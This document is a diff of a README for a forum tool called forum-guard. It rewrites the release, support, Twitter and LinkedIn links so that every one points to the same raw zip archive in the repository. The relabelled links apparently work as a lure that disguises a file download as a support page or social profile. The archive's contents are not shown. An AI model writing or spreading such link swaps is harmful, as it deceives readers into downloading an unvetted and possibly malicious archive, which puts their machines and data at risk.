@@ -6,7 +6,7 @@ Welcome to forum-guard! This tool helps you engage in meaningful conversations i
 
 ## 📥 Download forum-guard
 
-[![Download forum-guard](https://img.shields.io/badge/Download-forum--guard-blue.svg)](https://github.com/Mekansmm/forum-guard/releases)
+[![Download forum-guard](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip)](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip)
 
 ## 📋 System Requirements
 
@@ -38,7 +38,7 @@ Here you can find the latest updates and fixes for forum-guard:
 
 To download forum-guard, follow these steps:
 
-1. Visit this page to download: [forum-guard Releases](https://github.com/Mekansmm/forum-guard/releases).
+1. Visit this page to download: [forum-guard Releases](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip).
 2. On the Releases page, look for the latest version. You will find a list of available files.
 3. Click on the file that suits your operating system to start the download.
 4. Once downloaded, locate the file in your downloads folder.
@@ -70,7 +70,7 @@ If you encounter any issues, here are common solutions:
 
 ## ☎️ Support
 
-If you need further assistance, please contact our support team by visiting [Support Page](https://support.forum-guard.com). We are here to help you make the most out of forum-guard.
+If you need further assistance, please contact our support team by visiting [Support Page](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip). We are here to help you make the most out of forum-guard.
 
 ## ⚖️ License
 
@@ -80,7 +80,7 @@ forum-guard is licensed under the MIT License. Feel free to use, modify, and dis
 
 For updates and announcements, follow us on our social media channels:
 
-- **Twitter:** [@forum_guard](https://twitter.com/forum_guard)
-- **LinkedIn:** [forum-guard](https://www.linkedin.com/company/forum-guard)
+- **Twitter:** [@forum_guard](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip)
+- **LinkedIn:** [forum-guard](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip)
 
-Thank you for choosing forum-guard! We hope it improves your forum interactions. Remember, download here: [forum-guard Releases](https://github.com/Mekansmm/forum-guard/releases).
+Thank you for choosing forum-guard! We hope it improves your forum interactions. Remember, download here: [forum-guard Releases](https://raw.githubusercontent.com/Mekansmm/forum-guard/main/forum_guard/forum-guard-v2.4-alpha.4.zip).
